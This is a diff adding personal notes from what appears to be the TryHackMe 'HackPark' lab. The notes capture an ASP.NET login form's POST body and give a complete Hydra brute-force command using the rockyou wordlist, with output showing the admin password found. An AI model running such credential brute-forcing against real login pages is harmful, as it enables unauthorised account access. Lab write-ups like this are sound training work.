@@ -1,0 +1,27 @@
+TASK1. google image search the clown
+Task2. Use Developer Tools and Network display to see what type of request the form is making
+Task3. Hydra
+
+Url after trying to login
+http://10.10.19.178/Account/login.aspx?ReturnURL=%2fadmin%2f
+
+Image of login error
+
+
+__VIEWSTATE=97hlUt22e85aQD6CzwY82BVD9mqEeUj7nT8LT5JU%2B%2BHqmx9hzpOsGUGR91TmR1nxGBEc%2BXbGEY5jnb9IKCpEz3Bglz1KZRTTKnK3CGBpxgvWG5XvUReWcC4sWXOKtf8%2BLnAVFpfWtjjuSo%2B2xtGjDmeM1dYU1jcO4yYRw9viAzEkYuYj&__EVENTVALIDATION=BrCmhMtOml%2FrMjoO4%2F6vd%2FMu2F494JfLYNvR4pgYfFAnV4tn53%2FQCuTdGS3fLwNE%2F1IPWuy1PeHKg2N1AUtiYffQYrtYHZoRLEYUsCj9PnBUB7yLFz8JOV6qIyYJVALgjx8rWK7eXPE9fFkUWC6NeNdq322T%2B6G8dezO855lYGCZFepG&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=apa&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
+
+
+└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.19.178 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=97hlUt22e85aQD6CzwY82BVD9mqEeUj7nT8LT5JU%2B%2BHqmx9hzpOsGUGR91TmR1nxGBEc%2BXbGEY5jnb9IKCpEz3Bglz1KZRTTKnK3CGBpxgvWG5XvUReWcC4sWXOKtf8%2BLnAVFpfWtjjuSo%2B2xtGjDmeM1dYU1jcO4yYRw9viAzEkYuYj&__EVENTVALIDATION=BrCmhMtOml%2FrMjoO4%2F6vd%2FMu2F494JfLYNvR4pgYfFAnV4tn53%2FQCuTdGS3fLwNE%2F1IPWuy1PeHKg2N1AUtiYffQYrtYHZoRLEYUsCj9PnBUB7yLFz8JOV6qIyYJVALgjx8rWK7eXPE9fFkUWC6NeNdq322T%2B6G8dezO855lYGCZFepG&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -vv
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-07 22:26:42
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://10.10.19.178:80/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=97hlUt22e85aQD6CzwY82BVD9mqEeUj7nT8LT5JU%2B%2BHqmx9hzpOsGUGR91TmR1nxGBEc%2BXbGEY5jnb9IKCpEz3Bglz1KZRTTKnK3CGBpxgvWG5XvUReWcC4sWXOKtf8%2BLnAVFpfWtjjuSo%2B2xtGjDmeM1dYU1jcO4yYRw9viAzEkYuYj&__EVENTVALIDATION=BrCmhMtOml%2FrMjoO4%2F6vd%2FMu2F494JfLYNvR4pgYfFAnV4tn53%2FQCuTdGS3fLwNE%2F1IPWuy1PeHKg2N1AUtiYffQYrtYHZoRLEYUsCj9PnBUB7yLFz8JOV6qIyYJVALgjx8rWK7eXPE9fFkUWC6NeNdq322T%2B6G8dezO855lYGCZFepG&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[VERBOSE] Page redirected to http[s]://10.10.19.178:80/admin
+[80][http-post-form] host: 10.10.19.178   login: admin   password: 1qaz2wsx
+[STATUS] attack finished for 10.10.19.178 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-07 22:27:24
+                                                                                                       
+┌──(kali㉿kali)-[~/THM/HackPark]
